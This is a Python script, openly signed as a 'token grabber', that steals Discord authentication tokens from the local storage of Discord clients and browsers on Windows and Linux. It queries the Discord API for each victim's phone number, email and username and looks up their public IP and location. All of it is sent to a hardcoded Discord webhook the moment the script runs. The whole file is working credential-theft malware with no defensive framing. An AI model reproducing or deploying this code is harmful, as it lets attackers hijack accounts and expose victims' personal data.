import os 
import re
import time
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed

webhook = "https://discord.com/api/webhooks/842268179287375892/SIS9ZsBiTp64FSrupB8vhEqxEVY7qp-ykI1aKYXUd8Yn6fDPpEMXtMf1t-e65hVBd4E6"

def get_ip_information():
    request = requests.get("http://ipinfo.io/json")
    data = request.json()
    ip = data['ip']
    org = data['org']
    region = data['region']
    city = data['city']
    loc = data['loc']
    return ip, org, region, city, loc

def detect_operating_system():
    if os.name == "nt":
        operating_system = 0
    else:
        operating_system = 1
    return operating_system

def token_paths():
    if detect_operating_system() == 1:
        paths = {
            "Discord": os.environ['HOME'] + "/.config/discord",
            "Discord Canary": os.environ['HOME'] + "/.config/discordcanary",
            "Discord PTB": os.environ['HOME'] + "/.config/discordptb",
            "Google Chrome": os.environ['HOME'] + "/.config/google-chrome/Default", 
            "Chromium": os.environ['HOME'] + "/.config/chromium/Default",
            "Brave": os.environ['HOME'] + "/.config/BraveSoftware/Brave-Browser/Default",
            "Opera": os.environ['HOME'] + "/.config/opera"
        }
    else:
        paths = {
            "Discord": os.getenv("APPDATA") + "\\Discord",
            "Discord Canary": os.getenv("APPDATA") + "\\discordcanary",
            "Discord PTB": os.getenv("APPDATA") + "\\discordptb",
            "Google Chrome": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default",
            "Opera": os.getenv("APPDATA") + "\\Opera Software\\Opera Stable",
            "Brave": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex": os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }
    return paths

def get_tokens(path):
    so = detect_operating_system()
    if so == 0:
        path += "\\Local Storage\\leveldb"
    else:
        path += "/Local Storage/leveldb"
    tokens = []

    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}.[\w-]{6}.[\w-]{27}', r'mfa.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass
    
def get_browser_headers(token):
    headers = {
        "Content-Type":"application/json",
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Authorization":token
    }
    return headers

def get_account_info(headers):
    try:
        request = requests.get("https://discord.com/api/v6/users/@me", headers=headers)
        data = request.json()
        phone = str(data['phone']) 
        email = data['email']
        username = data['username'] + "#" +str(data['discriminator'])
        return phone, email, username
    except:
        pass
        
def send_fucking_tokens(tokens, webh, phone:None, email:None, username:None, ip:None, org:None, region:None, city:None, loc:None):
    counter = 0
    for token in zip(tokens):
        counter +=1 
        webhook = DiscordWebhook(url=webh)
        embed = DiscordEmbed(title="Tokens and Account information:", description=f"**From the user:** {username}", color = 0xff0008)
        embed.add_embed_field(name="IP Information: ", value=f"**Public IP:** {ip}\n**ISP:** {org}\n**Region:** {region}\n**City:** {city}\n**loc**{loc}")
        embed.add_embed_field(name='Token Information:', value=f'**Token #{counter}**\n {token}\n**Mobile Number:** {phone}\n **Email:** {email}')
        embed.set_image(url="https://media.discordapp.net/attachments/836787807132581939/838256791288020992/nationgif.gif")
        embed.set_footer(text="Token grabber by: Stolas")
    webhook.add_embed(embed)
    webhook.execute()
    
def main(webh=webhook):
    tokens = []
    browsers = []
    ip, org, region, city, loc = get_ip_information()
    paths = token_paths()
    for browser, path in paths.items():
        if os.path.exists(path) == False:
            continue
        for token in get_tokens(path):
            tokens.append(token)
            browsers.append(browser)
            headers = get_browser_headers(token)
            phone, email, username = get_account_info(headers)
            send_fucking_tokens(tokens, webh, phone, email, username, ip, org, region, city, loc)

main()
